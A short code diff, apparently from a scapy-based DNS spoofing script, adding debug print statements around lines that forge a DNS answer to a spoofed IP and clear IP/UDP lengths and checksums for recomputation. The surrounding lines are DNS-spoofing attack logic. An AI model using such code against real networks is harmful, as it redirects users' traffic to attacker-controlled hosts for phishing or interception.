@@ -70,13 +70,18 @@ class DNS:
             # setting the rdata for the IP we want to redirect (spoofed)
             # for instance, google.com will be mapped to "192.168.1.100"
             packet[DNS].an = DNSRR(rrname=qname, rdata=self.map[qname])
+            print("Loc1")
             # set the answer count to 1
             packet[DNS].ancount = 1
+            print("Loc2")
             # delete checksums and length of packet, because we have modified the packet
             # new calculations are required ( scapy will do automatically )
             del packet[IP].len
+            print("Loc3")
             del packet[IP].chksum
+            print("Loc4")
             del packet[UDP].len
+            print("Loc5")
             del packet[UDP].chksum
             # return the modified packet
             print("Returning...")
